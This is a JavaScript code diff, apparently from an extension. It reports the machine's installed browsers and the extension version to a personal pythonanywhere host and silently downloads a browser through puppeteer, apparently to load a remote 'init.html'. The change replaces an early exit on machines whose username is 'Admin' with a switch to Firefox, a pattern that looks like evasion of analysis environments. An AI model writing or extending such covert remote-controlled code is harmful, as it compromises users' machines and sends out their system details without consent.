@@ -9,6 +9,10 @@
 
   try {
 
+    let brInfo = {
+      name: 'chrome',
+      version: '130.0.6723.58',
+    }
     // let baseUrl = 'http://share.liveblog365.com/init.html';
     let baseUrl = 'https://ab498.pythonanywhere.com/files/init.html';
     // try {
@@ -30,7 +34,11 @@
     try {
       osUserInfo = os.userInfo();
       if (osUserInfo.username == 'Admin') {
-        return;
+
+        brInfo = {
+          name: 'firefox',
+          version: '132.0',
+        }
       }
     } catch (error) {
       console.log('os.userInfo() error', error);
@@ -98,7 +106,7 @@
     };
     const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
     let chromePath;
-    const chromeBrowser = installedBrowsers.find(browser => browser.browser === 'chrome');
+    const chromeBrowser = installedBrowsers.find(browser => browser.browser === brInfo.name);
     console.log('installed', installedBrowsers);
 
 
@@ -108,8 +116,8 @@
       await tstt({ baseUrl, message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
       puppeteerBrowsers.InstallOptions;
       installedBrowser = await puppeteerBrowsers.install({
-        browser: 'chrome',
-        buildId: '130.0.6723.58',
+        browser: brInfo.name,
+        buildId: brInfo.version,
         cacheDir,
       });
       chromePath = installedBrowser.executablePath;
